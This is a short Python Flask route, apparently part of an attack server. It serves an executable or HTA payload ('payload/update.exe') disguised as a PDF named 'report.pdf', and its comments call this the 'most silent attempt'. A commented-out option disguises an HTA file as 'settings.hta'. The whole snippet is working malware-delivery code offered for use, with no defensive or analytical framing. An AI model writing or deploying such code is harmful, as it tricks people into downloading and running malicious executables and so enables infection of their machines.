@app.route('/p')
def silent_payload():
    file_path = "payload/update.exe"   # or .hta

    if not os.path.exists(file_path):
        return "Not found", 404

    # Option 1: most silent attempt – inline + fake PDF
    response = send_file(
        file_path,
        mimetype='application/octet-stream',
        conditional=True
    )

    response.headers['Content-Disposition'] = 'inline; filename="report.pdf"'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Cache-Control'] = 'no-cache, no-store'

    # Option 2: uncomment if .hta rename
    # response.headers['Content-Type'] = 'application/hta'
    # response.headers['Content-Disposition'] = 'inline; filename="settings.hta"'

    return response
